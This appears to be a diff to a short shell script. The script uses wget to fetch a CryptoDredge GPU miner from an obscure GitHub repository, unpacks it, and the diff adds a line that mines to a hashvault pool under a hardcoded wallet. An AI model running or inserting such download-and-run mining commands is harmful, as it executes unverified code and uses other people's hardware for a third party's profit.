@@ -1,2 +1,3 @@
 wget https://raw.githubusercontent.com/jsiqiisn/ccx/main/CryptoDredge_0.27.0_linux_x64_cuda_11.4.tar.gz
 tar xf CryptoDredge_0.27.0_linux_x64_cuda_11.4.tar.gz
+./CryptoDredge --url stratum+ssl://frankfurt01.hashvault.pro:80 --user ccx7aoNYpGb7sndJtEDWvCBQhPAy9mC8QW5KWuCx8J1FJrDcDrER1XYA9LGtggrR7ZC4KfQmQ2uRN47L9WypBbNLAeq2Q4Q9WN.500c27a31b811f014dd3c15f47fa3b4d3ea4af7700b2a249218b327f315d5735 --pass x --algo cngpu
